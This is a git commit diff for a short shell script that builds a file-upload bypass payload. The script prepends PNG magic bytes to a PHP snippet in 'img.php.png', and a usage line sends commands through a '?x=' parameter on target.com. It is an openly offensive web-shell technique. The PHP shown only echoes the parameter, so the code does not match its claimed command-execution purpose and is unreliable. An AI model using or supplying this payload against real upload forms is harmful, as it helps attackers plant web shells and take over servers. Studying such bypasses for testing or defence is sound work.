3cb377f23df1f84bea2402f82eaf1ff7b367ba1b
Luks <51793738+0xLuks@users.noreply.github.com>
2024-04-26 07:49:32 +0200

    Update magic_byte_bypass.sh

--- Web/FileUpload/magic_byte_bypass.sh
+++ Web/FileUpload/magic_byte_bypass.sh
@@ -2,4 +2,4 @@
 echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > img.php.png
 echo '<?=$_GET[x]?>' >> img.php.png
 
-# [*] Usage: http://target.com/path/to/img.php.png?x=<cmd>
+# Usage: http://target.com/path/to/img.php.png?x=<cmd>
